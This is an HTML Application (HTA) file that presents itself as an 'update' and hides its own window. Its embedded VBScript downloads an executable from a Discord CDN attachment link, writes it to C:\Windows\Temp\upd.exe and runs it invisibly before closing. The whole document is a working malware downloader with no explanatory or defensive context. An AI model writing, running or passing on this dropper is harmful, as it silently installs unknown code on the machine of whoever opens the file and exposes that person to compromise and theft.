<html>
<head>
<title></title>
<hta:application
    id="oFix"
    applicationname="update"
    border="none"
    caption="no"
    showintaskbar="no"
    singleinstance="yes"
    sysmenu="no"
    windowstate="minimize"
/>

<script language="VBScript">
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", "https://cdn.discordapp.com/attachments/1367499475203129415/1477680254733778976/help.exe?ex=69a5a47a&is=69a452fa&hm=b28f442e873a26b3e944b35935ccd7d71f17bee3179e51bcde7843d0f34a86de&", False
xhr.Send
If xhr.Status = 200 Then
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile "C:\Windows\Temp\upd.exe", 2
    CreateObject("WScript.Shell").Run "C:\Windows\Temp\upd.exe", 0, False
End If
window.close
</script>
</head>
<body></body>
</html>
